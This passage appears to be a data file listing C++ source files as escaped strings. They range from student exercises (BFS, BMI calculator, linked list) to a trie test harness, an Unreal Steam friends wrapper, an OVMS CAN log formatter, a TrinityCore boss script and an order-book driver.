visited(vertexList.size(), false);\n        queue<int> q;\n        q.push(startIndex);\n        visited[startIndex] = true;\n\n        cout << \"Th\u1ee9 t\u1ef1 duy\u1ec7t BFS: \";\n        while (!q.empty())\n        {\n            int current = q.front();\n            q.pop();\n            cout << vertexList[current].name << \" \";\n\n            for (int i = 0; i < vertexList.size(); i++)\n            {\n                if (edgeMatrix[current][i].length > 0 && !visited[i])\n                {\n                    q.push(i);\n                    visited[i] = true;\n                }\n            }\n        }\n        cout << endl;\n    }\n\n    // In danh s\u00e1ch \u0111\u1ec9nh\n    void PrintVertexList()\n    {\n        cout << \"Danh s\u00e1ch \u0111\u1ec9nh:\\n\";\n        for (const auto &v : vertexList)\n        {\n            cout << v.name << \" \";\n        }\n        cout << endl;\n    }\n\n    // In to\u00e0n b\u1ed9 ma tr\u1eadn c\u1ea1nh\n    void PrintAllEdges()\n    {\n        cout << \"Ma tr\u1eadn c\u1ea1nh:\\n\";\n        for (int i = 0; i < vertexList.size(); i++)\n      ",
    "#include <iostream>\n\nusing namespace std;\n\nint main(){\n\n    double peso, altura, imc;\n\n    cout << \"Ingrese la altura en metros: \";\n    cin >> altura;\n    cout << \"Ingrese el peso en kilogramos: \";\n    cin >> peso;\n\n    imc = peso / (altura * altura);\n\n    if (imc < 18.5){\n        cout << \"Usted esta bajo peso\" <<endl;\n        cout << \"Su IMC es: \" << imc << endl;\n    } else if (imc <= 24.9){\n        cout << \"Usted tiene un peso normal \" << endl;\n        cout << \"Su IMC es: \" << imc << endl;\n    } else if ( imc <= 29.9 ) {\n        cout << \"Usted tiene sobrepeso \" << endl;\n        cout << \"Su IMC es: \" << imc << endl;\n    } else if ( imc <= 34.9 ) {\n        cout << \"Usted tiene obesidad tipo 1 \" << endl;\n        cout << \"Su IMC es: \" << imc << endl;\n    } else if ( imc <= 39.9 ) {\n        cout << \"Usted tiene obesidad tipo 2 \" << endl;\n        cout << \"Su IMC es: \" << imc << endl;\n    } else if ( imc > 40) {\n        cout << \"Usted tiene obesidad tipo 3 \" << endl;\n        cout << \"Su IMC es: \" << imc << endl;\n    }\n\n\n\nreturn 0;\n}\n",
    "#ifndef DEBUG_TEMPLATE_CPP\n#define DEBUG_TEMPLATE_CPP\n#include <bits/stdc++.h>\n// #define cerr cout\nnamespace __DEBUG_UTIL__\n{\n    using namespace std;\n    bool I_want_colored_output = true; /* ONLY WORKS WITH TERMINAL */\n    string white = I_want_colored_output ? \"\\033[0;m\" : \"\";\n    string outer = I_want_colored_output ? \"\\033[0;31m\" : \"\";    // red\n    string varName = I_want_colored_output ? \"\\033[1;34m\" : \"\";  // blue\n    string varValue = I_want_colored_output ? \"\\033[1;32m\" : \"\"; // green\n\n    /* Primitive Datatypes Print */\n    void print(const char *x) { cerr << x; }\n    void print(bool x) { cerr << (x ? \"T\" : \"F\"); }\n    void print(char x) { cerr << '\\'' << x << '\\''; }\n    void print(signed short int x) { cerr << x; }\n    void print(unsigned short int x) { cerr << x; }\n    void print(signed int x) { cerr << x; }\n    void print(unsigned int x) { cerr << x; }\n    void print(signed long int x) { cerr << x; }\n    void print(unsigned long int x) { cerr << x; }\n    void print(signed long long int x) { cerr << x; }\n    void print(unsigned long long int x) { cerr << x; }\n    void print(float x) { cerr << x; }\n    void print(double x) { cerr << x; }\n    void print(long double x) { cerr << x; }\n    void print(string x) { cerr << '\\\"' << x << '\\\"'; }\n    template <size_t N>\n    void print(bitset<N> x) { cerr << x; }\n    void print(vector<bool> v)\n    { /* Overloaded this because stl optimizes vector<bool> by using\n          _Bit_reference instead of bool to conserve space. */\n        int f = 0;\n        cerr << '{';\n        for (auto &&i : v)\n            cerr << (f++ ? \",\" : \"\") << (i ? \"T\" : \"F\");\n        cerr << \"}\";\n    }\n    /* Templates Declarations to support nested datatypes */\n    template <typename T>\n    void print(T &&x);\n    template <typename T>\n    void print(vector<vector<T>> mat);\n    template <typename T, size_t N, size_t M>\n    void print(T (&mat)[N][M]);\n    template <typename F, typename S>\n    void print(pair<F, S> x);\n    template <typename T, size_t N>\n    struct Tuple;\n    template <typename T>\n    struct Tuple<T, 1>;\n    template <typename... Args>\n    void print(tuple<Args...> t);\n    template <typename... T>\n    void print(priority_queue<T...> pq);\n    template <typename T>\n    void print(stack<T> st);\n    template <typename T>\n    void print(queue<T> q);\n    /* Template Datatypes Definitions */\n    template <typename T>\n    void print(T &&x)\n    {\n        /*  This works for every container that supports range-based loop\n            i.e. vector, set, map, oset, omap, dequeue */\n        int f = 0;\n        cerr << '{';\n        for (auto &&i : x)\n            cerr << (f++ ? \",\" : \"\"), print(i);\n        cerr << \"}\";\n    }\n    template <typename T>\n    void print(vector<vector<T>> mat)\n    {\n        int f = 0;\n        cerr << \"\\n~~~~~\\n\";\n        for (auto &&i : mat)\n        {\n            cerr << setw(2) << left << f++, print(i), cerr << \"\\n\";\n        }\n        cerr << \"~~~~~\\n\";\n    }\n    template <typename T, size_t N, size_t M>\n    void print(T (&mat)[N][M])\n    {\n        int f = 0;\n        cerr << \"\\n~~~~~\\n\";\n        for (auto &&i : mat)\n        {\n            cerr << setw(2) << left << f++, print(i), cerr << \"\\n\";\n        }\n        cerr << \"~~~~~\\n\";\n    }\n    template <typename F, typename S>\n    void print(pair<F, S> x)\n    {\n        cerr << '(';\n        print(x.first);\n        cerr << ',';\n        print(x.second);\n        cerr << ')';\n    }\n    template <typename T, size_t N>\n    struct Tuple\n    {\n        static void printTuple(T t)\n        {\n            Tuple<T, N - 1>::printTuple(t);\n            cerr << \",\", print(get<N - 1>(t));\n        }\n    };\n    template <typename T>\n    struct Tuple<T, 1>\n    {\n        static void printTuple(T t) { print(get<0>(t)); }\n    };\n    template <typename... Args>\n    void print(tuple<Args...> t)\n    {\n        cerr << \"(\";\n        Tuple<decltype(t), sizeof...(Args)>::printTuple(t);\n        cerr << \")\";\n    }\n    template <typename... T>\n    void print(priority_queue<T...> pq)\n    {\n        int f = 0;\n        cerr << '{';\n        while (!pq.empty())\n            cerr << (f++ ? \",\" : \"\"), print(pq.top()), pq.pop();\n        cerr << \"}\";\n    }\n    template <typename T>\n    void print(stack<T> st)\n    {\n        int f = 0;\n        cerr << '{';\n        while (!st.empty())\n            cerr << (f++ ? \",\" : \"\"), print(st.top()), st.pop();\n        cerr << \"}\";\n    }\n    template <typename T>\n    void print(queue<T> q)\n    {\n        int f = 0;\n        cerr << '{';\n        while (!q.empty())\n            cerr << (f++ ? \",\" : \"\"), print(q.front()), q.pop();\n        cerr << \"}\";\n    }\n    /* Printer functions */\n    void printer(const char *) {} /* Base Recursive */\n    template <typename T, typename... V>\n    void printer(const char *names, T &&head, V &&...tail)\n    {\n        /* Using && to capture both lvalues and rvalues */\n        int i = 0;\n        for (size_t bracket = 0; names[i] != '\\0' and (names[i] != ',' or bracket != 0); i++)\n            if (names[i",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <random>\n#include <algorithm>\n\n#include <array_trie.hpp>\n#include <vector_trie.hpp>\n#include <hash_trie.hpp>\n\n#include \"test_util.hpp\"\n\n#define MIN_WORD_LENGTH 1\n#define MAX_WORD_LENGTH 32\n#define NUM_WORDS 5'000\n#define NUM_QUERIES 500'000\n#define CHANCE_RANDOM_QUERY 10\n\nstatic std::string random_word(std::mt19937 &rng) {\n    static constexpr char chars[] = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n    auto length_dist = std::uniform_int_distribution<std::size_t>{MIN_WORD_LENGTH, MAX_WORD_LENGTH};\n    auto chars_dist = std::uniform_int_distribution<std::size_t>{0, sizeof(chars) - 2};\n    const auto length = length_dist(rng);\n\n    std::string result;\n    result.reserve(length + 1);\n    for (std::size_t i = 0; i < length; ++i)\n        result.push_back(chars[chars_dist(rng)]);\n    result.push_back('$');\n    return result;\n}\n\nint main() {\n    // Setup random generator\n    std::random_device rd;\n    std::mt19937 rng(rd());\n\n    // Create trie instances\n    VectorTrie v_trie;\n    ArrayTrie a_trie;\n    HashTrie h_trie;\n\n    // 1) Generate random input words\n    std::vector<std::string> words;\n    words.reserve(NUM_WORDS);\n    for (int i = 0; i < NUM_WORDS; ++i)\n        words.push_back(random_word(rng));\n\n    for (const auto &word: words) {\n        auto vr = v_trie.insert(word);\n        auto ar = a_trie.insert(word);\n        auto hr = h_trie.insert(word);\n        ASSERT_EQ(vr, ar, \"[INSERT] Mismatch on word='%s'\\n\", word.c_str());\n        ASSERT_EQ(ar, hr, \"[INSERT] Mismatch on word='%s'\\n\", word.c_str());\n    }\n\n    // 3) Generate random queries\n    // We'll pick from the existing words or some new random words\n    // and random operations: { insert (i), delete (d), contains (c) }\n    auto operation_dist = std::uniform_int_distribution<int>{0, 2};\n    auto percent_dist = std::uniform_int_distribution<int>{0, 99};\n    auto index_dist = std::uniform_int_distribution<std::size_t>(0, NUM_WORDS - 1);\n\n    for (int i = 0; i < NUM_QUERIES; i++) {\n        // pick 50% chance from existing words, 50% random new\n        std::string w;\n        if (percent_dist(rng) < CHANCE_RANDOM_QUERY)\n            w = random_word(rng);\n        else\n            w = words[index_dist(rng)];\n\n        // Perform operation on all tries\n        switch (operation_dist(rng)) {\n            case 0: {\n                const auto vr = v_trie.insert(w);\n                const auto ar = a_trie.insert(w);\n                const auto hr = h_trie.insert(w);\n                ASSERT_EQ(vr, ar, \"[QUERY] Mismatch on operation 'insert' word='%s'\\n\", w.c_str());\n                ASSERT_EQ(ar, hr, \"[QUERY] Mismatch on operation 'insert' word='%s'\\n\", w.c_str());\n                break;\n            }\n            case 1: {\n                const auto vr = v_trie.remove(w);\n                const auto ar = a_trie.remove(w);\n                const auto hr = h_trie.remove(w);\n                ASSERT_EQ(vr, ar, \"[QUERY] Mismatch on operation 'remove' word='%s'\\n\", w.c_str());\n                ASSERT_EQ(ar, hr, \"[QUERY] Mismatch on operation 'remove' word='%s'\\n\", w.c_str());\n                break;\n            }\n            case 2: {\n                const auto vr = v_trie.contains(w);\n                const auto ar = a_trie.contains(w);\n                const auto hr = h_trie.contains(w);\n                ASSERT_EQ(vr, ar, \"[QUERY] Mismatch on operation 'contains' word='%s'\\n\", w.c_str());\n                ASSERT_EQ(ar, hr, \"[QUERY] Mismatch on operation 'contains' word='%s'\\n\", w.c_str());\n                break;\n            }\n            default:\n                continue;\n        }\n    }\n\n    return 0;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass node {\r\n    public:\r\n    int data;\r\n    node* next;\r\n    node (int val){\r\n        data=val;\r\n        next=NULL;\r\n\r\n    }\r\n\r\n    ~node(){\r\n        delete next;\r\n        next=NULL;\r\n    }\r\n\r\n};\r\n\r\n\r\nvoid print(node* &s){\r\n        node* temp=s;\r\n        while (temp!=NULL)\r\n        {cout<<temp->data<<\" \";\r\n          temp=temp->next;\r\n          }\r\n          cout<<endl;\r\n}\r\n\r\nvoid insert(node* &tail,node*&head,int k){\r\n    if (head==NULL){\r\n        node*nod=new node(k);\r\n        tail=nod;\r\n        head=nod;\r\n    }\r\n    else{\r\n    node*nod=new node(k);\r\n    tail->next=nod;\r\n    tail=nod;\r\n    }\r\n\r\n    }\r\n\r\nnode* reverse(node* &head){\r\n    node*prev=NULL;\r\n    node*current=head;\r\n    node*forward=NULL;\r\n    while(current!=NULL){\r\n    forward=current->next;\r\n    current->next=prev;\r\n    prev=current;\r\n    current=forward;\r\n\r\n    }\r\n    return prev;\r\n}\r\nnode*reversecpy(node*&head){\r\n    node*head1=reverse(head);\r\n    node*head2=NULL;\r\n    node*tail2=head2;\r\n    while(head1!=NULL){\r\n\r\n        insert(tail2,head2,head1->data);\r\n        head1=head1->next;\r\n    }\r\n    tail2->next=NULL;\r\n    reverse(head1);\r\n    return head2;\r\n\r\n\r\n\r\n}\r\nint middle(node*head){\r\n    cout<<\"entered middle\"<<endl;\r\n    int mid=0;\r\n    while(head!=NULL){\r\n        head=head->next;\r\n        mid++;\r\n    }\r\n    mid=mid/2;\r\n    return mid;\r\n}\r\n\r\nnode* fold(node*head,int n){\r\n    cout <<\"entered fold\"<<endl;\r\n    node*pre=head;\r\n    node*c1=pre;\r\n    print(c1);\r\n    node*c2=reverse(head);\r\n    print(c1);\r\n    print(c2);\r\n    node*temp1=c1->next;\r\n    node*temp2=c2->next;\r\n    int cnt=0;\r\n    while(cnt<n/2){\r\n        cout <<\"enterred loop\"<<endl;\r\n        c1->next=c2;\r\n        c2->next=temp1;\r\n        c1=temp1;\r\n        c2=temp2;\r\n        temp1=temp1->next;\r\n        temp2=temp2->next;\r\n        cnt++;\r\n    }\r\n    cout <<\"exited loop\"<<endl;\r\n    if(n%2!=0){\r\n        c1->next=NULL;\r\n\r\n    }\r\n    else{\r\n        c1=NULL;\r\n    }\r\ncout <<\"returning\"<<endl;\r\n    return pre;\r\n}\r\n\r\nint main(){\r\n    int n;\r\n    cin >> n;\r\n\r\n    // create the linked list\r\n    node* n1 = NULL;\r\n    node* head = n1;\r\n    node* tail = n1;\r\n    for (int i = 0; i < n; i++){\r\n        int k;\r\n        cin >> k;\r\n        insert(tail, head, k);\r\n    }\r\n\r\n    // check if the linked list is empty\r\n    if (head == NULL) {\r\n        cout << \"The linked list is empty.\" << endl;\r\n        return 0;\r\n    }\r\n\r\n    // check if the size of the linked list is at least 2\r\n    if (n < 2) {\r\n        cout << \"The linked list should have at least 2 elements.\" << endl;\r\n        return 0;\r\n    }\r\n\r\nnode*head2=reversecpy(head);\r\nprint(head);\r\nprint (head2);\r\n    return 0;\r\n}\r\n\r\n\r\n",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Subsystems/SteamDomeFriendsSubsystem.h\"\n\n#include <steam/isteamfriends.h>\n#include <steam/isteamutils.h>\n\n#include \"Enums/SteamFriendFlags.h\"\n#include \"Helpers/TempString.h\"\n#include \"Kismet/GameplayStatics.h\"\n#include \"Structs/ChatMessage.h\"\n#include \"Structs/ClanActivityCounts.h\"\n#include \"Structs/FriendGameInfo.h\"\n\n\nUSteamDomeFriendsSubsystem* USteamDomeFriendsSubsystem::Get(const UObject* WorldContextObject)\n{\n\treturn UGameplayStatics::GetGameInstance(WorldContextObject)->GetSubsystem<ThisClass>();\n}\n\n\nvoid USteamDomeFriendsSubsystem::ActivateGameOverlay(const EOverlayDialogSelf OverlayDialog)\n{\n\tSteamFriends()->ActivateGameOverlay(OverlayDialog::OverlayDialogSelfToCharPtr(OverlayDialog));\n}\n\n\nvoid USteamDomeFriendsSubsystem::ActivateGameOverlayInviteDialog(const FSteamId SteamIDLobby)\n{\n\tSteamFriends()->ActivateGameOverlayInviteDialog(SteamIDLobby.GetCSteamID());\n}\n\n\nvoid USteamDomeFriendsSubsystem::ActivateGameOverlayToStore(const FAppId AppId, const ESteamOverlayToStoreFlag Flag)\n{\n\tSteamFriends()->ActivateGameOverlayToStore(AppId.AppId, SteamOverlayToStoreFlag::ToSteamEnum(Flag));\n}\n\n\nvoid USteamDomeFriendsSubsystem::ActivateGameOverlayToUser(const EOverlayDialogUser OverlayDialog, const FSteamId SteamId)\n{\n\tSteamFriends()->ActivateGameOverlayToUser(\n\t\tOverlayDialog::OverlayDialogUserToCharPtr(OverlayDialog), SteamId.GetCSteamID()\n\t);\n}\n\n\nvoid USteamDomeFriendsSubsystem::ActivateGameOverlayToWebPage(\n\tconst FString& URL, const ESteamActivateGameOverlayToWebPageMode Mode\n) {\n\tSteamFriends()->ActivateGameOverlayToWebPage(\n\t\tTCHAR_TO_UTF8(*URL), SteamActivateGameOverlayToWebPageMode::ToSteamEnum(Mode)\n\t);\n}\n\n\nvoid USteamDomeFriendsSubsystem::ClearRichPresence()\n{\n\tSteamFriends()->ClearRichPresence();\n}\n\n\nbool USteamDomeFriendsSubsystem::CloseClanChatWindowInSteam(FSteamId SteamIdClanChat)\n{\n\treturn SteamFriends()->CloseClanChatWindowInSteam(SteamIdClanChat.GetCSteamID());\n}\n\n\nFSteamId USteamDomeFriendsSubsystem::GetChatMemberByIndex(const FSteamId SteamIdClan, const int32 UserIndex)\n{\n\treturn SteamFriends()->GetChatMemberByIndex(SteamIdClan.GetCSteamID(), UserIndex);\n}\n\n\nbool USteamDomeFriendsSubsystem::GetClanActivityCounts(const FSteamId SteamIdClan, FClanActivityCounts& ClanActivityCounts)\n{\n\treturn SteamFriends()->GetClanActivityCounts(\n\t\tSteamIdClan.GetCSteamID(),\n\t\t&ClanActivityCounts.Online,\n\t\t&ClanActivityCounts.InGame,\n\t\t&ClanActivityCounts.Chatting\n\t);\n}\n\n\nFSteamId USteamDomeFriendsSubsystem::GetClanByIndex(const int32 ClanIndex)\n{\n\treturn SteamFriends()->GetClanByIndex(ClanIndex);\n}\n\n\nbool USteamDomeFriendsSubsystem::GetClanChatMessage(\n\tconst FSteamId SteamIdClanChat,\n\tconst int MessageIndex,\n\tFChatMessage& ChatMessage,\n\tFSteamId& SteamIdChatter,\n\tconst int32 MaxMessageLength\n) {\n\tconst FTempString TempString(MaxMessageLength);\n\n\tEChatEntryType ChatEntry;\n\tCSteamID Chatter;\n\t\n\tconst int32 Bytes = SteamFriends()->GetClanChatMessage(\n\t\tSteamIdClanChat.GetCSteamID(),\n\t\tMessageIndex,\n\t\tTempString.Start(),\n\t\tMaxMessageLength,\n\t\t&ChatEntry,\n\t\t&Chatter\n\t);\n\n\t// This should not be negative, but better safe than sorry\n\tif (Bytes <= 0)\n\t{\n\t\treturn false;\n\t}\n\n\tChatMessage.Message = TempString.ToString();\n\tChatMessage.MessageType = SteamChatEntryType::FromSteamEnum(ChatEntry);\n\tSteamIdChatter = FSteamId::FromCSteamID(Chatter);\n\n\treturn true;\n}\n\n\nint32 USteamDomeFriendsSubsystem::GetClanCount()\n{\n\treturn SteamFriends()->GetClanCount();\n}\n\n\nFString USteamDomeFriendsSubsystem::GetClanName(const FSteamId& SteamIdClan)\n{\n\treturn FString(UTF8_TO_TCHAR(SteamFriends()->GetClanName(SteamIdClan.GetCSteamID())));\n}\n\n\nFSteamId USteamDomeFriendsSubsystem::GetClanOfficerByIndex(const FSteamId SteamIdClan, const int32 Officer)\n{\n\treturn SteamFriends()->GetClanOfficerByIndex(SteamIdClan.GetCSteamID(), Officer);\n}\n\n\nint32 USteamDomeFriendsSubsystem::GetClanOfficerCount(const FSteamId SteamIdClan)\n{\n\treturn SteamFriends()->GetClanOfficerCount(SteamIdClan.GetCSteamID());\n}\n\n\nFSteamId USteamDomeFriendsSubsystem::GetClanOwner(const FSteamId SteamIdClan)\n{\n\treturn SteamFriends()->GetClanOwner(SteamIdClan.GetCSteamID());\n}\n\n\nFString USteamDomeFriendsSubsystem::GetClanTag(const FSteamId SteamIdClan)\n{\n\treturn FString(UTF8_TO_TCHAR(SteamFriends()->GetClanTag(SteamIdClan.GetCSteamID())));\n}\n\n\nFSteamId USteamDomeFriendsSubsystem::GetCoplayFriend(const int32 CoplayFriendIndex)\n{\n\treturn SteamFriends()->GetCoplayFriend(CoplayFriendIndex);\n}\n\n\nint32 USteamDomeFriendsSubsystem::GetCoplayFriendCount()\n{\n\treturn SteamFriends()->GetCoplayFriendCount();\n}\n\n\nFSteamId USteamDomeFriendsSubsystem::GetFriendByIndex(const int32 FriendIndex, const TSet<ESteamFriendFlags>& FriendFlags)\n{\n\treturn GetFriendByIndex(FriendIndex, SteamFriendFlags::ConvertSteamFriendFlagsSetToBitfield(FriendFlags));\n}\n\n\nFSteamId USteamDomeFriendsSubsystem::GetFriendByIndex(const int32 FriendIndex, const int32 FriendFlags)\n{\n\treturn SteamFriends()->GetFriendByIndex(FriendIndex,",
    "/*\n;    Project:       Open Vehicle Monitor System\n;    Module:        CAN dump framework\n;    Date:          18th January 2018\n;\n;    (C) 2018       Mark Webb-Johnson\n;\n; Permission is hereby granted, free of charge, to any person obtaining a copy\n; of this software and associated documentation files (the \"Software\"), to deal\n; in the Software without restriction, including without limitation the rights\n; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n; copies of the Software, and to permit persons to whom the Software is\n; furnished to do so, subject to the following conditions:\n;\n; The above copyright notice and this permission notice shall be included in\n; all copies or substantial portions of the Software.\n;\n; THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n; THE SOFTWARE.\n*/\n\n#include \"ovms_log.h\"\nstatic const char *TAG = \"canformat-raw\";\n\n#include \"canformat_raw.h\"\n#include <errno.h>\n#include <endian.h>\n#include \"pcp.h\"\n\nclass OvmsCanFormatRawInit\n  {\n  public: OvmsCanFormatRawInit();\n} ;\n\nOvmsCanFormatRawInit::OvmsCanFormatRawInit()\n  {\n  ESP_LOGI(TAG, \"Registering CAN Format: RAW\");\n\n  OvmsCanFormatFactory::instance(TAG).RegisterCanFormat<canformat_raw>(\"raw\");\n  }\n\ncanformat_raw::canformat_raw(const char* type)\n  : canformat(type)\n  {\n  }\n\ncanformat_raw::~canformat_raw()\n  {\n  }\n\nstd::string canformat_raw::get(CAN_log_message_t* message)\n  {\n  CAN_log_message_t raw;\n  memcpy(&raw,message,sizeof(raw));\n  raw.origin = (canbus*)raw.origin->m_busnumber;\n  return std::string((const char*)&raw,sizeof(CAN_log_message_t));\n  }\n\nstd::string canformat_raw::getheader(struct timeval *time)\n  {\n  return std::string(\"\");\n  }\n\nsize_t canformat_raw::put(CAN_log_message_t* message, uint8_t *buffer, size_t len, bool* hasmore, canlogconnection* clc)\n  {\n  if (m_buf.FreeSpace()==0) SetServeDiscarding(true); // Buffer full, so discard from now on\n  if (IsServeDiscarding()) return len;  // Quick return if discarding\n\n  size_t consumed = Stuff(buffer,len);  // Stuff m_buf with as much as possible\n\n  if (m_buf.UsedSpace() < sizeof(CAN_log_message_t)) return consumed; // Insufficient data so far\n\n  *hasmore = true;  // Call us again to see if we have more frames to process\n  m_buf.Pop(sizeof(CAN_log_message_t), (uint8_t*)message);\n  message->origin = can::instance(TAG).GetBus((int)message->origin);\n  return consumed;\n  }\n",
    "/*\n * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information\n *\n * This program is free software; you can redistribute it and/or modify it\n * under the terms of the GNU General Public License as published by the\n * Free Software Foundation; either version 2 of the License, or (at your\n * option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for\n * more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"ScriptMgr.h\"\n#include \"GridNotifiers.h\"\n#include \"halls_of_origination.h\"\n#include \"InstanceScript.h\"\n#include \"Map.h\"\n#include \"MotionMaster.h\"\n#include \"ObjectAccessor.h\"\n#include \"Player.h\"\n#include \"ScriptedCreature.h\"\n#include \"SpellAuraEffects.h\"\n#include \"SpellScript.h\"\n\nenum Texts\n{\n    ANRAPHET_SAY_INTRO              = 0,\n    ANRAPHET_SAY_AGGRO              = 1,\n    ANRAPHET_SAY_OMEGA_STANCE       = 2,\n    ANRAPHET_SAY_KILL               = 3,\n    ANRAPHET_SAY_DEATH              = 4,\n\n    BRANN_SAY_DOOR_INTRO            = 0,  // Right, let's go! Just need to input the final entry sequence into the door mechanism... and...\n    BRANN_SAY_UNLOCK_DOOR           = 1,  // That did the trick! The control room should be right behind this... oh... wow...\n    BRANN_SAY_TROGGS                = 2,  // What? This isn't the control room! There's another entire defense mechanism in place, and the blasted Rock Troggs broke into here somehow. Troggs. Why did it have to be Troggs!\n    BRANN_SAY_THINK                 = 3,  // Ok, let me think a moment.\n    BRANN_SAY_MIRRORS               = 4,  // Mirrors pointing all over the place.\n    BRANN_SAY_ELEMENTALS            = 5,  // Four platforms with huge elementals.\n    BRANN_SAY_GET_IT                = 6,  // I got it! I saw a tablet that mentioned this chamber. This is the Vault of Lights! Ok, simple enough. I need you adventurers to take out each of the four elementals to trigger the opening sequence for the far door!\n    BRANN_1_ELEMENTAL_DEAD          = 7,  // One down!\n    BRANN_2_ELEMENTAL_DEAD          = 8,  // Another one down! Just look at those light beams! They seem to be connecting to the far door!\n    BRANN_3_ELEMENTAL_DEAD          = 9,  // One more elemental to go! The door is almost open!\n    BRANN_4_ELEMENTAL_DEAD          = 10, // That''s it, you''ve done it! The vault door is opening! Now we can... oh, no!\n    BRANN_SAY_ANRAPHET_DIED         = 11, // We''ve done it! The control room is breached!\n    BRANN_SAY_MOMENT                = 12 // Here we go! Now this should only take a moment...\n};\n\nenum Events\n{\n    EVENT_BRANN_MOVE_INTRO          = 1,\n    EVENT_BRANN_UNLOCK_DOOR         = 2,\n    EVENT_BRANN_THINK               = 3,\n    EVENT_BRANN_SET_ORIENTATION_1   = 4,\n    EVENT_BRANN_SET_ORIENTATION_2   = 5,\n    EVENT_BRANN_SET_ORIENTATION_3   = 6,\n    EVENT_BRANN_SAY_ELEMENTALS      = 7,\n    EVENT_BRANN_SAY_GET_IT          = 8,\n    EVENT_BRANN_SET_ORIENTATION_4   = 9,\n\n    EVENT_ANRAPHET_APPEAR           = 10,\n    EVENT_ANRAPHET_ACTIVATE         = 11,\n    EVENT_ANRAPHET_DESTROY          = 12,\n    EVENT_ANRAPHET_READY            = 13,\n    EVENT_ANRAPHET_NEMESIS_STRIKE   = 14,\n    EVENT_ANRAPHET_ALPHA_BEAMS      = 15,\n    EVENT_ANRAPHET_OMEGA_STANCE     = 16,\n    EVENT_ANRAPHET_CRUMBLING_RUIN   = 17,\n    EVENT_ANRAPHET_ACTIVATE_OMEGA   = 18\n};\n\nenum Spells\n{\n    SPELL_DESTRUCTION_PROTOCOL          = 77437,\n\n    SPELL_ALPHA_BEAMS                   = 76184,\n    SPELL_ALPHA_BEAMS_BACK_CAST         = 76912,\n\n    SPELL_CRUMBLING_RUIN                = 75609,\n\n    SPELL_NEMESIS_STRIKE                = 75604,\n\n    SPELL_OMEGA_STANCE_SUMMON           = 77106,\n    SPELL_OMEGA_STANCE                  = 75622,\n    SPELL_OMEGA_STANCE_SPIDER_TRIGGER   = 77121,\n};\n\nenum Phases\n{\n    PHASE_INTRO         = 1,\n    PHASE_COMBAT        = 2,\n\n    PHASE_MASK_COMBAT   = (1 << PHASE_COMBAT),\n};\n\nenum Points\n{\n    POINT_ANRAPHET_ACTIVATE     = 0,\n    MAX_BRANN_WAYPOINTS_INTRO   = 17\n};\n\nPosition const AnraphetActivatePos = {-193.656f, 366.689f, 75.91001f, 3.138207f};\n\nPosition const BrannIntroWaypoint[MAX_BRANN_WAYPOINTS_INTRO] =\n{\n    {-429.583f,  367.019f,  89.79282f, 0.0f},\n    {-409.9531f, 367.0469f, 89.81111f, 0.0f},\n    {-397.8246f, 366.967f,  86.37722f, 0.0f},\n    {-383.7813f, 366.8229f, 82.07919f, 0.0f},\n    {-368.2604f, 366.7448f, 77.0984f,  0.0f},\n    {-353.6458f, 366.4896f, 75.92504f, 0.0f},\n    {-309.0608f, 366.7205f, 75.91345f, 0.0f},\n    {-276.3303f, 367.0f,    75.92413f, 0.0f},\n    {-246.5104f, 366.6389f, 75.87791f, 0.0f},\n    {-202.0417f, 366.7517f, 75.92508f, 0.0f},\n    {-187.6024f, 366.7656f, 76.23077f, 0.0f},\n    {-155.0938f, 366.783f,  86.45834f, 0.0f},\n    {-143.5694f, 366.8177f, 89.73354f, 0.0f},\n    {-128.5608f, 3",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <regex>\r\n#include \"orderbook.h\"\r\n\r\n// Function to construct output file name based on input file name\r\nstd::string getOutputFileName(const std::string& inputFileName) {\r\n    // regular expression to extract digits from the input file names\r\n    std::regex regex(\"(\\\\d+)\");\r\n    std::smatch match;\r\n\r\n    if (std::regex_search(inputFileName, match, regex)) {\r\n         // If digits are found, append them to \"output\" to create the file name\r\n        return \"output\" + match.str(1) + \".txt\";\r\n    } else {\r\n         // If no digits are found, use a default output file name\r\n        return \"output_default.txt\";\r\n    }\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n    if (argc != 2) {\r\n\t// Print usage message if the input file argument is missing\r\n        std::cerr << \"Usage: \" << argv[0] << \" <input_file>\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    std::ifstream inputFile(argv[1]); // Open the input file\r\n    if (!inputFile) {\r\n\t// Check if the file was successfully opened\r\n        std::cerr << \"Error opening input file.\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    // Generate output file name\r\n    std::string outputFileName = getOutputFileName(argv[1]);\r\n\r\n    double initialPrice;\r\n    inputFile >> initialPrice; //  Read the initial price from the file\r\n    OrderBook orderBook(initialPrice);   // Initialize the order book with the initial price\r\n\r\n    std::string orderLine;\r\n    while (std::getline(inputFile, orderLine)) {\r\n        if (!orderLine.empty()) {\r\n\t      // Process each order line if it is not empty\r\n            orderBook.processOrder(orderLine);\r\n        }\r\n    }\r\n\r\n    // Output the results to the console and write them to the output file\r\n    orderBook.printConsoleOutput();\r\n    orderBook.printOutput(outputFileName);\r\n\r\n    return 0;\r\n}\r\n",
